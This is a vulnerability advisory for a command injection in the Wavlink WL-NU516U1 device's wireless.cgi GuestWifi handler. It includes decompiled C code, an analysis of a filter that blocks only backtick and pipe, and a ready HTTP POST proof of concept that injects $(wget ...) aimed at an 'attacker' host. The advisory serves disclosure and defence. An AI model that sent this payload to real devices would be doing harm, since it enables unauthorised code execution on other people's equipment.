# WL-NU516U1 wireless.cgi GuestWifi Guest_password Command Injection

Vendor: Wavlink

Product: WL-NU516U1

Version: M16U1_V240425
Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A

Vulnerability: Command Injection

CVE: TBD

## Affected version

Wavlink WL-NU516U1 M16U1_V240425

## Vulnerability details

Wavlink WL-NU516U1 M16U1_V240425 contains a command injection vulnerability in /cgi-bin/wireless.cgi.

When the `page` parameter is set to `GuestWifi`, the function `sub_4032E4` is invoked.

The function reads the `Guest_password` POST parameter via `sub_405EA8`, which performs URL decoding but no sanitization.

The decoded value is passed to `sub_407504("rai1", "WPAPSK", v45)`, which constructs a shell command:

```c
sprintf(v8, "iwpriv %s set %s=\"%s\"", "rai1", "WPAPSK", v45);
system(v8);
```

The input filter `sub_4074A0` only blocks backtick (`` ` ``) and pipe (`|`) characters. The `$(cmd)` syntax is not filtered, allowing arbitrary command execution.

Conditions: `guestEn=1`, `Authentication_Mode=2` (non-OPEN mode).

## Binary Analysis

### Call Chain

```
ftext (main router)
  → sub_4032E4 (GuestWifi handler)
    → sub_405EA8 (URL decode, reads Guest_password POST parameter)
    → sub_4074A0 (input filter, blocks ` and | only)
    → sub_407504 (iwpriv_cmd, sprintf+system)
```

### Key Functions

**sub_4032E4 (GuestWifi handler):**
- Reads POST parameters: `guestEn`, `Guest_ssid`, `Guest_password`, `Authentication_Mode`
- When `guestEn=1` and `Authentication_Mode != 1` (non-OPEN), calls `sub_407504("rai1", "WPAPSK", Guest_password)`

**sub_407504 (iwpriv_cmd):**
```c
int sub_407504(const char *a1, const char *a2, const char *a3) {
    char v8[1028];
    memset(v8, 0, 1024);
    sprintf(v8, "iwpriv %s set %s=\"%s\"", a1, a2, a3);
    system(v8);
}
```

**sub_4074A0 (input filter):**
- Iterates through each character of the input string
- Blocks character if ASCII value is 96 (backtick `` ` ``) or 124 (pipe `|`)
- Does NOT block: `$`, `(`, `)`, `;`, `&`, `|` (in other contexts)

### Vulnerability Flow

1. User sends POST request with `page=GuestWifi&guestEn=1&Authentication_Mode=2&Guest_password=$(wget http://attacker:6666/callback)`
2. `sub_4032E4` reads `Guest_password` → `$(wget http://attacker:6666/callback)`
3. `sub_4074A0` checks each character: `$`, `(`, `w`, `g`, `e`, `t`, ... none are blocked
4. `sub_407504` constructs: `iwpriv rai1 set WPAPSK="$(wget http://attacker:6666/callback)"`
5. `system()` executes the command, shell interprets `$(wget ...)` as command substitution
6. `wget` connects to attacker's server, confirming command execution

## Proof of Concept (PoC)

```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 96

page=GuestWifi&guestEn=1&Authentication_Mode=2&Guest_password=$(wget http://192.168.6.1:6666/guest_pw)
```

**Verification:** Monitor receives `GET /guest_pw` from device IP, confirming command execution.

## Root Cause Summary

The root cause is the combination of:
1. No sanitization of user input before shell command construction
2. Incomplete input filter that only blocks backtick and pipe, missing `$()` command substitution
3. Direct use of `system()` with user-controlled string
